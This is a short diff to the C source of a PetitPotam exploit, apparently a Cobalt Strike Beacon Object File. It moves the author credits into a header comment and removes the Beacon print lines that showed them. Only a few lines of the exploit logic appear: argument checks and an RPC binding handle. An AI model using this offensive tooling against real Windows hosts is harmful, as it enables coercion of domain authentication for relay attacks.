@@ -1,3 +1,8 @@
+/*
+PetitPotam exploit by Cneelis @Outflank
+Based on original code by @topotam77
+*/
+
 #include <windows.h>
 
 #include "PetitPotam.h"
@@ -153,9 +158,6 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		BeaconPrintf(CALLBACK_ERROR, "Missing arguments");
 		return;
 	}
-
-	BeaconPrintToStreamW(L"[>] PetitPotam exploit by Cneelis @Outflank\n");
-	BeaconPrintToStreamW(L"[>] Based on original code by @topotam77\n\n");
 
 	MSVCRT$wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);
 	rStatus = CreateBindingHandle(wcRPCTarget, &bHandle);
